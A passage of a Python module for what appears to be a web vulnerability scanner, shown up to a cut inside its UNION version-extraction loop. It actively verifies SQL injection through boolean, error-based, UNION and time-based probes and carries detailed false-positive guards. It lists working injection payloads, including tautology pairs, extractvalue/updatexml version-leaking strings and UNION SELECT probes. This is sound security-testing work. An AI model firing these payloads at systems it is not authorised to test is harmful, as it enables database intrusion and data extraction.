"""
SQL Injection Verifier: Active verification for SQL injection vulnerabilities.

Implements four techniques ordered by reliability:
  1. Boolean-based differential  - sqlmap-style directional check with double confirmation
  2. Error-based detection       - SQL-engine-specific markers only, absent from baseline
  3. UNION-based detection       - canary-first; differential paths require 3+ column hits
  4. Time-based blind            - relative floor, not hardcoded; skipped if server is slow

False-positive philosophy
--------------------------
Every technique must pass TWO independent checks before reporting a hit.
No single-payload, single-check result is ever reported as vulnerable.

Key fixes vs. the previous version
------------------------------------
Problem 1  - UNION similarity 0.01 being treated as a hit.
  Fix       - Hard gate: similarity < 0.10 is a page-transition/error-page, SKIP.
              This replaces the broken _UNION_SIM_MIN = 0.05 floor which was
              undercut by ResponseAnalyzer.is_significant_change returning True.

Problem 2  - Version extraction firing on page-transition responses.
  Fix       - Version extraction is only attempted when the NULL-differential
              response has similarity IN [0.10, 0.97]. If the NULL probe itself
              would be skipped, so is the version probe that follows it.

Problem 3  - Stable column-count differential (75 confidence, reproducible=True)
              firing on non-SQL pages (captcha, exec).
  Fix       - Minimum 3 payloads in the valid window required (was 2), AND an
              additional cross-column confirmation probe must pass before
              is_vulnerable is set True. Single-payload and dual-payload hits
              are always suppressed.

Problem 4  - login.php username (similarity 0.03) being reported.
  Fix       - Covered by the 0.10 hard floor above.

Problem 5  - xss_s/txtName sqlite_version() false positive.
  Fix       - The canary path is now the ONLY path that can set is_vulnerable=True
              on a page-transition response. Version extraction requires the
              corresponding NULL probe to have passed the similarity gate first.

Design: canary-first, everything else is circumstantial
--------------------------------------------------------
UNION detection hierarchy (confidence order):
  90 - Canary reflected in response, absent from baseline       (proof of extraction)
  90 - Version indicator in response, absent from baseline,
       AND parent NULL probe passed similarity gate             (strong proof)
  suppressed - NULL-only differential changes without extraction proof
               are treated as instability/semantic response changes, not SQLi
"""

import asyncio
import difflib
import logging
from typing import Optional

from app.config import get_settings
from app.core.crawler.models import ParameterLocation
from app.core.detectors.attack_surface import AttackTarget
from app.core.verification.response_analyzer import ResponseAnalyzer, ResponseData, is_dead_baseline
from app.core.verification.verification_framework import (
    BaseVerifier,
    URLParameterBuilder,
    VerificationResult,
)
from shared.models.vulnerability import OwaspCategory, SeverityLevel

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Confidence thresholds
# ---------------------------------------------------------------------------

_HIGH_CONFIDENCE_THRESHOLD = 85.0

# ---------------------------------------------------------------------------
# Boolean differential thresholds (sqlmap-style directional check)
# ---------------------------------------------------------------------------

# TRUE  response must be >= this similar to baseline (query still returns rows)
_BOOL_TRUE_MATCH_MIN  = 0.80
# FALSE response must be <= this similar to baseline (query returns no rows)
_BOOL_FALSE_MATCH_MAX = 0.60

# ---------------------------------------------------------------------------
# Page stability
# ---------------------------------------------------------------------------

# If natural variance between two identical requests exceeds this threshold
# (i.e., similarity drops below _STABILITY_FLOOR), boolean + UNION are
# disabled for that parameter.
_STABILITY_FLOOR = 0.70   # raised from 0.60 - tighter gate

# ---------------------------------------------------------------------------
# UNION similarity window
# ---------------------------------------------------------------------------

# Hard floor: below this, the response is a completely different page
# (error page, redirect-within-200, broken query). This is the primary
# fix for the 0.01-similarity false positives.
_UNION_SIM_MIN = 0.10     # raised from 0.05 - the critical fix

# Hard ceiling: above this, the UNION was silently ignored or wrong column count.
_UNION_SIM_MAX = 0.97

# Minimum number of NULL-count payloads that must fall in the valid window
# before a differential UNION hit is considered reproducible.
_UNION_MIN_SIGNIFICANT_PAYLOADS = 3   # raised from 2

# ---------------------------------------------------------------------------
# SQL-engine-specific error markers
# Intentionally excludes generic "error", "warning", "invalid input".
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# FIX 1: Replace the two "risky" bare function-name markers with their 
#         actual error-message forms. These are what MySQL actually outputs.
# ---------------------------------------------------------------------------

_SQL_SPECIFIC_MARKERS = frozenset({
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg::exception",
    "postgresql error",
    "ora-",
    "oracle error",
    "sqlite3::exception",
    "sqlite_error",
    "supplied argument is not a valid mysql",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql_query",
    "com.mysql.jdbc",
    "sqlstate",
    "sqlexception",
    "division by zero in",
    # FIX: was "extractvalue(" and "updatexml(" - these are function NAMES that
    # get reflected verbatim by XSS endpoints. Replace with the actual MySQL
    # XPATH error messages that only appear on real injection.
    "xpath syntax error",                        # MySQL extractvalue/updatexml error
    "invalid xml",                               # alternate XPATH error form
    "invalid column name",
    "sql server",
    "odbc microsoft access",
    "jet database engine",
    "syntax error in query expression",
})

# Version strings that indicate DB version extraction succeeded.
# Must be ABSENT from baseline to count.
_VERSION_INDICATORS = frozenset({
    "mysql",
    "mariadb",
    "postgres",
    "sqlite",
    "ubuntu",
    "debian",
    "microsoft sql server",
})

# Boolean injection contexts - (true_payload, false_payload)
_BOOL_PAYLOAD_PAIRS = [
    ("' AND '1'='1",     "' AND '1'='2"),
    ("' AND 1=1--",      "' AND 1=2--"),
    (" AND 1=1--",       " AND 1=2--"),
    ("') AND ('1'='1",   "') AND ('1'='2"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    ("' AND 1=1#",       "' AND 1=2#"),
    ("' AND 1=1/*",      "' AND 1=2/*"),
]


# ---------------------------------------------------------------------------
# Utility
# ---------------------------------------------------------------------------

def _body_similarity(a: Optional[str], b: Optional[str]) -> float:
    """
    Sequence-matcher similarity between two response bodies.
    Returns 1.0 for None/empty inputs (treat missing as identical to avoid
    false volatility signals on probe failures).
    """
    a = a or ""
    b = b or ""
    if not a and not b:
        return 1.0
    return difflib.SequenceMatcher(None, a, b).ratio()


def _has_sql_specific_error(text: str) -> bool:
    """True if text contains at least one SQL-engine-specific error marker."""
    lowered = text.lower()
    return any(m in lowered for m in _SQL_SPECIFIC_MARKERS)


# ---------------------------------------------------------------------------
# FIX 2: Strip the FULL composed injection value (baseline + payload),
#         not just the payload suffix. Also strip %28/%29 hex-encoded parens.
# ---------------------------------------------------------------------------

def _new_sql_errors(
    baseline_body: str,
    injected_body: str,
    payload: str,
    baseline_value: str = "",
) -> list[str]:
    import urllib.parse
    import html

    bl  = baseline_body.lower()
    inj = injected_body.lower()

    full_injected = (baseline_value + payload).lower()
    payload_lower = payload.lower()

    # Generate an exhaustive array of reflection combinations
    candidates = {
        full_injected,
        urllib.parse.quote_plus(full_injected),
        urllib.parse.quote(full_injected),
        full_injected.replace("(", "%28").replace(")", "%29"),
        html.escape(full_injected),
        full_injected.replace("'", "&#39;").replace('"', "&quot;"),
        full_injected.replace("'", "&#039;"),
        
        # Suffix fallbacks
        payload_lower,
        urllib.parse.quote_plus(payload_lower),
        urllib.parse.quote(payload_lower),
        html.escape(payload_lower),
        payload_lower.replace("'", "&#39;").replace('"', "&quot;"),
        payload_lower.replace("'", "&#039;"),
    }

    # Atomically strip all potential echo signatures
    for candidate in candidates:
        if candidate:
            inj = inj.replace(candidate, "")

    return [m for m in _SQL_SPECIFIC_MARKERS if m in inj and m not in bl]

def _new_version_indicators(baseline_body: str, injected_body: str) -> list[str]:
    """
    Return version indicators present in injected_body but absent from
    baseline_body. The baseline exclusion is critical - "mysql" commonly
    appears in page footers, framework error messages, and help text.
    """
    bl = baseline_body.lower()
    inj = injected_body.lower()
    return [v for v in _VERSION_INDICATORS if v in inj and v not in bl]


def _similarity_in_union_window(sim: float) -> bool:
    """True if similarity is within the valid UNION differential window."""
    return _UNION_SIM_MIN <= sim <= _UNION_SIM_MAX


# ---------------------------------------------------------------------------
# Main verifier
# ---------------------------------------------------------------------------

class SQLiVerifier(BaseVerifier):
    """Verifies SQL injection vulnerabilities through active testing."""

    module_name = "sqli"

    def __init__(self, timeout_seconds: float = 10.0):
        super().__init__(timeout_seconds)
        self.timeout_seconds = timeout_seconds

    # ======================================================================
    # Public entry point
    # ======================================================================

    async def verify(
        self,
        url: str,
        parameter: str,
        method: str = "GET",
        value: str = "",
        form_inputs: Optional[list] = None,
        target: Optional[object] = None,
    ) -> VerificationResult:
        self._begin_verification(parameter)
        results: list[VerificationResult] = []

        # Keep this strictly local to the function scope
        baseline_value = self._resolve_baseline_value(
            url, parameter, value, form_inputs
        )

        pre_test_baseline = await self.fetch_pre_test_baseline(
            url, parameter, method, baseline_value, form_inputs, target=target
        )

        _run_differential = True
        _run_error_time   = True

        # Gate 0: phpinfo/debug page exclusion - these pages echo everything
        # and trigger false SQL error matches, false UNION reflections, etc.
        if pre_test_baseline is not None and ResponseAnalyzer.is_phpinfo_or_debug_page(
            pre_test_baseline.body or ""
        ):
            logger.debug(
                "Skipping all SQLi techniques on phpinfo/debug page %s:%s",
                url, parameter,
            )
            return VerificationResult(
                is_vulnerable=False, confidence_score=0.0,
                detection_method="none", findings=[],
                evidence={"skipped": "phpinfo_or_debug_page"},
            )

        # Gate 0.5: Dead-baseline abort. When the UNMODIFIED baseline is
        # 401/403/404/405 the target is unreachable/unauthorized/wrong-shape as
        # sent, so no injection differential can exist — firing the full payload
        # matrix (boolean/error/UNION/time) only produces 4xx noise. Login-style
        # SQLi is unaffected: its baseline is a healthy 200 (only the deliberate
        # false payload returns 401). A None/governor-denied baseline is not dead
        # and falls through to the normal (best-effort) path.
        if is_dead_baseline(pre_test_baseline):
            logger.debug(
                "Skipping all SQLi techniques on dead baseline (HTTP %s) %s:%s",
                pre_test_baseline.status_code, url, parameter,
            )
            return VerificationResult(
                is_vulnerable=False, confidence_score=0.0,
                detection_method="none", findings=[],
                evidence={"skipped": "dead_baseline", "baseline_status": pre_test_baseline.status_code},
            )

        # Gate 1: Content Type Check
        if pre_test_baseline is not None:
            # ... content type checks ...
            pass

        # Gate 2: Per-Parameter Stability Check
        if _run_differential and pre_test_baseline is not None:
            stability = await self._measure_page_stability(
                url, parameter, baseline_value, method, form_inputs, pre_test_baseline, target=target
            )
            if stability < _STABILITY_FLOOR:
                _run_differential = False

        # Gate 3: Parameter Characterisation
        if _run_differential and pre_test_baseline is not None:
            char = await self._characterise_parameter(
                url, parameter, method, baseline_value, form_inputs, pre_test_baseline, target=target
            )
            if not char["reflective"]:
                logger.debug(
                    "Parameter %s:%s characterised as non-reflective (sim≥0.90) - "
                    "skipping boolean and UNION, going straight to time-based",
                    url, parameter,
                )
                _run_differential = False

        # Technique 1: Boolean Differential (Pass baseline_value explicitly)
        if _run_differential:
            result = await self._verify_boolean_based(
                url, parameter, method, baseline_value, form_inputs, pre_test_baseline, target=target
            )
            if result.is_vulnerable:
                results.append(result)
                if result.confidence_score >= _HIGH_CONFIDENCE_THRESHOLD:
                    return result

        # Technique 2: Error-Based
        if _run_error_time:
            result = await self._verify_error_based(
                url, parameter, method, baseline_value, form_inputs, pre_test_baseline, target=target
            )
            if result.is_vulnerable:
                results.append(result)
                if result.confidence_score >= _HIGH_CONFIDENCE_THRESHOLD:
                    return result

        # Technique 3: UNION-Based
        if _run_differential:
            result = await self._verify_union_based(
                url, parameter, method, baseline_value, form_inputs, pre_test_baseline, target=target
            )
            if result.is_vulnerable:
                results.append(result)

        # Technique 4: Time-Based
        if _run_error_time and not results:
            result = await self._verify_time_based(
                url, parameter, method, baseline_value, form_inputs, pre_test_baseline, target=target
            )
            if result.is_vulnerable:
                results.append(result)

        if results:
            results.sort(key=lambda r: r.confidence_score, reverse=True)
            best = results[0]
            for r in results[1:]:
                best.findings.extend(r.findings)
                best.evidence.update(r.evidence)
            return best

        return VerificationResult(
            is_vulnerable=False, confidence_score=0.0,
            detection_method="none", findings=[], evidence={},
        )


    # ======================================================================
    # Helper: resolve baseline value and build HTTP request args
    # ======================================================================

    def _resolve_baseline_value(
        self,
        url: str,
        parameter: str,
        value: str,
        form_inputs: Optional[list],
    ) -> str:
        """Use the caller-provided value, then URL query, then form field default."""
        if value:
            return value

        from_url = URLParameterBuilder.get_parameter_value(url, parameter)
        if from_url:
            return from_url

        if form_inputs:
            for inp in form_inputs:
                if getattr(inp, "name", "") == parameter:
                    field_value = getattr(inp, "value", "") or ""
                    if field_value:
                        return field_value
                    break

        return value

    def _build_request_args(
        self,
        url: str,
        parameter: str,
        payload_value: str,
        method: str,
        form_inputs: Optional[list],
        baseline_value: str = "",  # Default value makes it optional positionally!
        *,
        inject: bool = True,
        target: Optional[object] = None,
    ) -> tuple[str, Optional[dict], Optional[dict], Optional[object], Optional[dict]]:
        
        if isinstance(target, AttackTarget):
            prepared = target.build_request(payload_value, merge_with_baseline=inject)
            return (
                prepared.url,
                prepared.params,
                prepared.data,
                prepared.json_body,
                prepared.headers,
            )

        if inject:
            payload_value = f"{baseline_value}{payload_value}"

        if method.upper() == "POST" and form_inputs is not None:
            target = AttackTarget(
                url=url,
                parameter=parameter,
                method=method,
                form_inputs=form_inputs,
                location=ParameterLocation.form,
            )
            prepared = target.build_request(payload_value, merge_with_baseline=inject)
            return prepared.url, prepared.params, prepared.data, prepared.json_body, prepared.headers

        fallback_target = AttackTarget(
            url=url,
            parameter=parameter,
            method=method,
            form_inputs=form_inputs,
            location=ParameterLocation.query,
        )
        prepared = fallback_target.build_request(payload_value, merge_with_baseline=inject)
        return prepared.url, prepared.params, prepared.data, prepared.json_body, prepared.headers

    # ======================================================================
    # Helper: page stability measurement
    # ======================================================================

    async def _measure_page_stability(
        self,
        url: str,
        parameter: str,
        baseline_value: str,  # Accepted here
        method: str,
        form_inputs: Optional[list],
        pre_test_baseline: ResponseData,
        target: Optional[object] = None,
    ) -> float:
        try:
            probe_url, probe_params, probe_data, probe_json, probe_headers = self._build_request_args(
                url, parameter, baseline_value, method, form_inputs, baseline_value, inject=False, target=target
            )
            probe_resp = await self._send(
                probe_url, method, probe_params, probe_data,
                headers=probe_headers,
                json_body=probe_json,
                test_phase="stability_probe",
            )
            stability = _body_similarity(pre_test_baseline.body, probe_resp.body)
            return stability
        except Exception as e:
            return 1.0
        
    async def _characterise_parameter(self, url, parameter, method, value, form_inputs, baseline, target=None):
        """
        Determine which techniques are applicable:
          - reflective: true/false content difference exists → boolean/UNION viable
          - error_visible: SQL errors appear in responses → error-based viable
          - always: time-based always attempted (last resort)
        """
        false_url, false_params, false_data, false_json, false_headers = self._build_request_args(
            url, parameter, "' AND '1'='2'--", method, form_inputs, baseline_value=value, target=target
        )
        false_resp = await self._send(false_url, method, false_params, false_data,
                                      headers=false_headers,
                                      json_body=false_json,
                                      test_phase="characterise_false")
        sim = _body_similarity(baseline.body, false_resp.body)
        is_reflective = sim < 0.90
        return {"reflective": is_reflective}
        
    # ======================================================================
    # Technique 1: Boolean-based differential (sqlmap-style)
    # ======================================================================

    async def _verify_boolean_based(
        self,
        url: str,
        parameter: str,
        method: str,
        value: str,
        form_inputs: Optional[list] = None,
        pre_test_baseline: Optional[ResponseData] = None,
        target: Optional[object] = None,
    ) -> VerificationResult:
        """
        Boolean-based blind SQLi using directional similarity checks.

        For each injection context:
          TRUE  response must be >= 0.80 similar to baseline (rows returned)
          FALSE response must be <= 0.60 similar to baseline (no rows returned)
          Status codes must match baseline across all payloads.

        On first passing context, a second independent confirmation pair must
        also pass before is_vulnerable is set True. Two rounds passing
        independently is strong evidence against coincidence.
        """
        try:
            baseline = pre_test_baseline or await self.fetch_pre_test_baseline(
                url, parameter, method, value, form_inputs, target=target
            )

            confirmed_true_payload  = None
            confirmed_false_payload = None
            confirmed_analysis      = None
            confirmed_context       = None

            for true_payload, false_payload in _BOOL_PAYLOAD_PAIRS:

                true_url, true_params, true_data, true_json, true_headers = self._build_request_args(
                    url, parameter, true_payload, method, form_inputs, baseline_value=value, target=target
                )
                true_resp = await self._send(
                    true_url, method, true_params, true_data,
                    headers=true_headers, json_body=true_json,
                    test_phase="boolean_true", payload=true_payload,
                )

                false_url, false_params, false_data, false_json, false_headers = self._build_request_args(
                    url, parameter, false_payload, method, form_inputs, baseline_value=value, target=target
                )
                false_resp = await self._send(
                    false_url, method, false_params, false_data,
                    headers=false_headers, json_body=false_json,
                    test_phase="boolean_false", payload=false_payload,
                )

                # Budget-denied probe: untested, never a negative differential. Skip.
                if true_resp.not_tested or false_resp.not_tested:
                    continue

                _, analysis = ResponseAnalyzer.analyze_boolean_differential(
                    baseline, true_resp, false_resp
                )
                true_sim  = analysis.get("baseline_similarity_to_true",  1.0)
                false_sim = analysis.get("baseline_similarity_to_false", 1.0)

                if not (true_sim >= _BOOL_TRUE_MATCH_MIN and false_sim <= _BOOL_FALSE_MATCH_MAX):
                    logger.debug(
                        "Boolean context '%s' failed directional check %s:%s "
                        "(true_sim=%.2f≥%.2f, false_sim=%.2f≤%.2f)",
                        true_payload, url, parameter,
                        true_sim, _BOOL_TRUE_MATCH_MIN, false_sim, _BOOL_FALSE_MATCH_MAX,
                    )
                    continue

                if (true_resp.status_code != baseline.status_code or
                        false_resp.status_code != baseline.status_code):
                    logger.debug(
                        "Boolean context '%s' status changed %s:%s "
                        "(baseline=%s, true=%s, false=%s)",
                        true_payload, url, parameter,
                        baseline.status_code, true_resp.status_code, false_resp.status_code,
                    )
                    continue

                confirmed_true_payload  = true_payload
                confirmed_false_payload = false_payload
                confirmed_analysis = {
                    "baseline_similarity_to_true":  true_sim,
                    "baseline_similarity_to_false": false_sim,
                    "context": true_payload,
                }
                confirmed_context = true_payload
                break

            if confirmed_true_payload is None:
                return VerificationResult(
                    is_vulnerable=False, confidence_score=0.0,
                    detection_method="boolean_differential", findings=[],
                    evidence={"tested_contexts": len(_BOOL_PAYLOAD_PAIRS)},
                )

            # Second independent pair with substituted values.
            confirm_true  = confirmed_true_payload.replace("1=1", "3=3").replace("'1'='1", "'x'='x")
            confirm_false = confirmed_false_payload.replace("1=2", "3=4").replace("'1'='2", "'x'='y")

            ct_url, ct_params, ct_data, ct_json, ct_headers = self._build_request_args(
                url, parameter, confirm_true, method, form_inputs, target=target
            )
            cf_url, cf_params, cf_data, cf_json, cf_headers = self._build_request_args(
                url, parameter, confirm_false, method, form_inputs, target=target
            )
            ct_resp = await self._send(
                ct_url, method, ct_params, ct_data,
                headers=ct_headers, json_body=ct_json,
                test_phase="boolean_confirm_true", payload=confirm_true,
            )
            cf_resp = await self._send(
                cf_url, method, cf_params, cf_data,
                headers=cf_headers, json_body=cf_json,
                test_phase="boolean_confirm_false", payload=confirm_false,
            )

            _, confirm_analysis = ResponseAnalyzer.analyze_boolean_differential(
                baseline, ct_resp, cf_resp
            )
            ct_sim = confirm_analysis.get("baseline_similarity_to_true",  1.0)
            cf_sim = confirm_analysis.get("baseline_similarity_to_false", 1.0)

            if not (ct_sim >= _BOOL_TRUE_MATCH_MIN and cf_sim <= _BOOL_FALSE_MATCH_MAX):
                logger.debug(
                    "Boolean confirmation failed %s:%s (ct_sim=%.2f, cf_sim=%.2f)",
                    url, parameter, ct_sim, cf_sim,
                )
                return VerificationResult(
                    is_vulnerable=False, confidence_score=0.0,
                    detection_method="boolean_differential", findings=[],
                    evidence={
                        **confirmed_analysis,
                        "suppressed": "confirmation_failed",
                        "confirm_true_sim": ct_sim, "confirm_false_sim": cf_sim,
                    },
                )

            confidence = 80.0
            finding = self._create_finding(
                category=OwaspCategory.a05,
                vuln_type="SQL Injection (Boolean-Based Blind)",
                severity=SeverityLevel.high,
                url=url, parameter=parameter, payload=confirmed_true_payload,
                evidence=(
                    f"TRUE payload '{confirmed_true_payload}' → {confirmed_analysis['baseline_similarity_to_true']:.0%} similar to baseline. "
                    f"FALSE payload '{confirmed_false_payload}' → {confirmed_analysis['baseline_similarity_to_false']:.0%} similar. "
                    f"Confirmed with independent pair (true_sim={ct_sim:.2f}, false_sim={cf_sim:.2f})."
                ),
                confidence_score=confidence, detection_method="boolean_differential",
                method=method,
                detection_evidence={
                    "first_pair": confirmed_analysis,
                    "confirm_true_sim": ct_sim, "confirm_false_sim": cf_sim,
                    "injection_context": confirmed_context,
                },
                reproducible=True, verified=True,
                verification_request_snippet=ct_resp.request_snippet,
                verification_response_snippet=ct_resp.response_snippet,
            )
            return VerificationResult(
                is_vulnerable=True, confidence_score=confidence,
                detection_method="boolean_differential", findings=[finding],
                evidence=confirmed_analysis, reproducible=True,
            )

        except Exception as e:
            logger.error("Boolean verification failed %s:%s: %s", url, parameter, e)
            return VerificationResult(
                is_vulnerable=False, confidence_score=0.0,
                detection_method="boolean_differential", findings=[],
                evidence={"error": str(e)},
            )

    # ======================================================================
    # Technique 2: Error-based
    # ======================================================================

# ======================================================================
    # Technique 2: Error-based
    # ======================================================================

    async def _verify_error_based(
        self,
        url: str,
        parameter: str,
        method: str,
        value: str,
        form_inputs: Optional[list] = None,
        pre_test_baseline: Optional[ResponseData] = None,
        target: Optional[object] = None,
    ) -> VerificationResult:
        """
        Error-based SQLi detection.

        Only SQL-engine-specific error markers count. The marker must be
        ABSENT from the baseline to prevent false positives on pages that
        already display SQL errors in their normal state (admin panels,
        debug-mode apps, etc.).

        Two independent payloads must both trigger a new SQL-specific error
        before is_vulnerable is set True. A single-payload error hit is
        recorded in evidence but not reported as vulnerable.
        """
        error_payloads = [
            "'",
            "\"",
            "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
            "' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--",
            "' AND CAST((SELECT version())::text AS NUMERIC)--",
            "' AND CAST(@@version AS INT)--",
            "' AND ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))--",
            "' AND abs(-9223372036854775808)--",
            " AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
            " AND CAST(@@version AS INT)--",
        ]

        try:
            baseline = pre_test_baseline or await self.fetch_pre_test_baseline(
                url, parameter, method, value, form_inputs, target=target
            )
            baseline_body = baseline.body or ""

            first_hit_payload: Optional[str] = None
            first_hit_errors:  Optional[list[str]] = None
            first_hit_resp:    Optional[ResponseData] = None

            for payload in error_payloads:
                inj_url, inj_params, inj_data, inj_json, inj_headers = self._build_request_args(
                    url, parameter, payload, method, form_inputs, baseline_value=value, target=target
                )
                inj_resp = await self._send(
                    inj_url, method, inj_params, inj_data,
                    headers=inj_headers,
                    json_body=inj_json,
                    test_phase="error_injection", payload=payload,
                )
                # Budget-denied probe: untested, never a negative. Skip scoring.
                if inj_resp.not_tested:
                    continue
                inj_body = inj_resp.body or ""

                # FIX: Replaced self._baseline_value with the local variable 'value'
                errors = _new_sql_errors(baseline_body, inj_body, payload, value or "")
                if not errors:
                    continue

                if first_hit_payload is None:
                    first_hit_payload = payload
                    first_hit_errors  = errors
                    first_hit_resp    = inj_resp
                    continue

                # If we get here, a second independent payload also confirmed an error
                all_errors = list(set(first_hit_errors + errors))
                confidence = 85.0

                finding = self._create_finding(
                    category=OwaspCategory.a05,
                    vuln_type="SQL Injection (Error-Based)",
                    severity=SeverityLevel.critical,
                    url=url, parameter=parameter, 
                    payload=payload,  
                    evidence=(
                        f"SQL-engine error triggered by '{first_hit_payload}' "
                        f"and confirmed by '{payload}'. "
                        f"Errors (absent from baseline): {', '.join(all_errors[:3])}."
                    ),
                    confidence_score=confidence, detection_method="error_based",
                    method=method,
                    detection_evidence={
                        "errors_detected": all_errors,
                        "first_payload": first_hit_payload,
                        "confirm_payload": payload,
                    },
                    reproducible=True, verified=True,
                    verification_request_snippet=inj_resp.request_snippet,
                    verification_response_snippet=inj_resp.response_snippet,
                )

                return VerificationResult(
                    is_vulnerable=True, confidence_score=confidence,
                    detection_method="error_based", findings=[finding],
                    evidence={"errors": all_errors}, reproducible=True,
                )

            return VerificationResult(
                is_vulnerable=False, confidence_score=0.0,
                detection_method="error_based", findings=[],
                evidence={
                    "first_hit": first_hit_payload,
                    "note": "single error hit - not reported without confirmation",
                } if first_hit_payload else {},
            )

        except Exception as e:
            logger.error("Error-based verification failed %s:%s: %s", url, parameter, e)
            return VerificationResult(
                is_vulnerable=False, confidence_score=0.0,
                detection_method="error_based", findings=[],
                evidence={"error": str(e)},
            )
    # ======================================================================
    # Technique 3: UNION-based
    # ======================================================================

    async def _verify_union_based(
            self,
            url: str,
            parameter: str,
            method: str,
            value: str,
            form_inputs: Optional[list] = None,
            pre_test_baseline: Optional[ResponseData] = None,
            target: Optional[object] = None,
        ) -> VerificationResult:
            """
            UNION-based SQLi detection with robust text-storage/reflection guards.
            """
            union_null_payloads = [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            ]

            try:
                baseline = pre_test_baseline or await self.fetch_pre_test_baseline(
                    url, parameter, method, value, form_inputs, target=target
                )
                baseline_body = baseline.body or ""
                baseline_body_low = baseline_body.lower()

                # ----------------------------------------------------------------
                # Pass 1: Canary probes (strongest signal - no similarity gate needed)
                # ----------------------------------------------------------------
                for null_count in range(1, 6):
                    canary = ResponseAnalyzer.generate_probe_canary()
                    cols = ["NULL"] * null_count
                    cols[0] = f"'{canary}'"
                    canary_payload = f"' UNION SELECT {','.join(cols)}--"

                    inj_url, inj_params, inj_data, inj_json, inj_headers = self._build_request_args(
                        url, parameter, canary_payload, method, form_inputs, target=target
                    )
                    inj_resp = await self._send(
                        inj_url, method, inj_params, inj_data,
                        headers=inj_headers,
                        json_body=inj_json,
                        test_phase="union_canary", payload=canary_payload,
                    )

                    canary_reflected, _ = ResponseAnalyzer.verify_reflection(
                        canary_payload, inj_resp.body,
                        baseline_body=baseline_body, canary=canary,
                    )
                    
                    if canary_reflected:
                        if ResponseAnalyzer.is_phpinfo_or_debug_page(inj_resp.body or ""):
                            logger.debug(
                                "UNION canary '%s' reflected on diagnostic/debug page. Suppressing SQLi false positive.",
                                canary,
                            )
                            continue
                        if ResponseAnalyzer.is_request_metadata_reflection(inj_resp.body or "", canary):
                            logger.debug(
                                "UNION canary '%s' reflected in request metadata dump. Suppressing SQLi false positive.",
                                canary,
                            )
                            continue
                        # --------------------------------------------------------
                        # UNIVERSAL ANTI-XSS GUARD: Detect literal text reflection
                        # --------------------------------------------------------
                        inj_body_low = (inj_resp.body or "").lower()
                        canary_low = canary.lower()
                        
                        xss_indicators = [
                            f"'{canary_low}'",         # Raw single quotes
                            f"\\'{canary_low}\\'",     # Escaped single quotes
                            f"&#39;{canary_low}&#39;",   # HTML entity single quotes
                            f"&apos;{canary_low}&apos;", # XML/HTML apostrophe
                            f'"{canary_low}"',         # Double quotes fallback
                            f'\\"{canary_low}\\"',     # Escaped double quotes
                            f"&quot;{canary_low}&quot;" # HTML entity double quotes
                        ]
                        
                        if any(indicator in inj_body_low for indicator in xss_indicators):
                            logger.debug(
                                "UNION canary '%s' found, but it is wrapped in payload quote syntax. "
                                "Suppressing false positive caused by XSS reflection/storage.", 
                                canary
                            )
                            continue

                        finding = self._create_finding(
                            category=OwaspCategory.a05,
                            vuln_type="SQL Injection (UNION-Based)",
                            severity=SeverityLevel.high,
                            url=url, parameter=parameter, payload=canary_payload,
                            evidence=(
                                f"UNION canary '{canary}' reflected in response body. "
                                f"Value absent from baseline - confirms data extraction."
                            ),
                            confidence_score=90.0, detection_method="union_based",
                            method=method,
                            detection_evidence={
                                "verification_canary": canary,
                                "canary_verified": True,
                            },
                            reproducible=True, verified=True,
                            verification_request_snippet=inj_resp.request_snippet,
                            verification_response_snippet=inj_resp.response_snippet,
                        )
                        return VerificationResult(
                            is_vulnerable=True, confidence_score=90.0,
                            detection_method="union_based", findings=[finding],
                            evidence={"canary_verified": True, "canary": canary},
                            reproducible=True,
                        )

                # ----------------------------------------------------------------
                # Pass 2: NULL differential - collect payloads in the valid window.
                # This is also the gate for Pass 3 version extraction.
                # ----------------------------------------------------------------
                valid_null_probes: list[tuple[str, ResponseData, float]] = []

                for payload in union_null_payloads:
                    inj_url, inj_params, inj_data, inj_json, inj_headers = self._build_request_args(
                        url, parameter, payload, method, form_inputs, target=target
                    )
                    inj_resp = await self._send(
                        inj_url, method, inj_params, inj_data,
                        headers=inj_headers,
                        json_body=inj_json,
                        test_phase="union_null", payload=payload,
                    )

                    # Budget-denied probe: untested, never a negative. Skip scoring.
                    if inj_resp.not_tested:
                        continue

                    # ------------------------------------------------------------
                    # GUARD #1: Stop Stored XSS text pollution from impacting Pass 2 / 4
                    # ------------------------------------------------------------
                    inj_body_low = (inj_resp.body or "").lower()
                    if "union select" in inj_body_low and "union select" not in baseline_body_low:
                        logger.debug(
                            "UNION NULL payload keywords 'UNION SELECT' detected literally in response body. "
                            "Suppressing false positive caused by literal text storage/reflection."
                        )
                        continue

                    if inj_resp.status_code != 200:
                        logger.debug(
                            "UNION NULL '%s' non-200 status (%s) %s:%s - skip",
                            payload, inj_resp.status_code, url, parameter,
                        )
                        continue

                    sim = _body_similarity(baseline_body, inj_resp.body or "")

                    if sim < _UNION_SIM_MIN:
                        logger.debug(
                            "UNION NULL '%s' similarity %.2f < %.2f (page transition) %s:%s - skip",
                            payload, sim, _UNION_SIM_MIN, url, parameter,
                        )
                        continue

                    if sim > _UNION_SIM_MAX:
                        logger.debug(
                            "UNION NULL '%s' similarity %.2f > %.2f (no change) %s:%s - skip",
                            payload, sim, _UNION_SIM_MAX, url, parameter,
                        )
                        continue

                    valid_null_probes.append((payload, inj_resp, sim))

                if not valid_null_probes:
                    return VerificationResult(
                        is_vulnerable=False, confidence_score=0.0,
                        detection_method="union_based", findings=[], evidence={},
                    )

                # ----------------------------------------------------------------
                # Pass 3: Version extraction.
                # ----------------------------------------------------------------
                version_extracted_body: Optional[str] = None
                version_payload_used:   Optional[str] = None

                version_expressions = [
                    "@@version",
                    "version()",
                    "sqlite_version()",
                    "@@global.version",
                ]

                for parent_payload, parent_resp, parent_sim in valid_null_probes:
                    num_cols = parent_payload.count("NULL")

                    for v_expr in version_expressions:
                        for col_idx in range(num_cols):
                            cols = ["NULL"] * num_cols
